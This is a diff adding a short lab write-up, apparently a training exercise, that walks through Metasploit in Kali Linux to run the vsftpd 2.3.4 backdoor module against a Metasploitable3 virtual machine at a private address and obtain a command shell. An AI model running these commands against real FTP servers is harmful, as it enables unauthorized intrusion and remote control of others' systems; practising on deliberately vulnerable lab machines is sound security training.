@@ -1,0 +1,19 @@
+FTP Attack Using Metasploit
+
+1. Opened terminal in Kali Linux.
+2. Launched Metasploit Framework:
+   $ msfconsole
+
+3. Searched for an FTP exploit:
+   msf6 > search ftp
+
+4. Selected a relevant FTP exploit module:
+   msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+
+5. Set the RHOST to the Metasploitable3 IP address:
+   msf6 > set RHOST 192.168.56.103
+
+6. Checked the options and launched the exploit:
+   msf6 > exploit
+
+7. Exploit successfully opened a command shell if the vulnerability existed.
